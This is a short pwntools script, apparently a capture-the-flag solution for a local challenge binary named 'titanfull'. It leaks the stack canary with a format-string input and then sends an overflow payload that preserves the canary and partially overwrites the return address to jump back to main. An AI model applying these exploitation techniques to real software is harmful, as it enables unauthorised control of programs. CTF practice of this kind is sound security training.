from pwn import *

rem = process("./Pwnable/Titanfull/problem/titanfull")
# gdb.attach(rem)

elf = ELF("./Pwnable/Titanfull/problem/titanfull")

main_addr = elf.symbols['main']
bss_addr = elf.bss()

rem.sendlineafter(b"> ", b"%17$p")
rem.recvuntil(b"0x")
canary = int(rem.recvn(16), 16)

rem.sendlineafter(b"> ", b"7274")
payload = b"A" * 0x18 + p64(canary) + b"A" * 8 + p64(main_addr)[0:1]
rem.sendafter(b": ", payload)

rem.interactive()
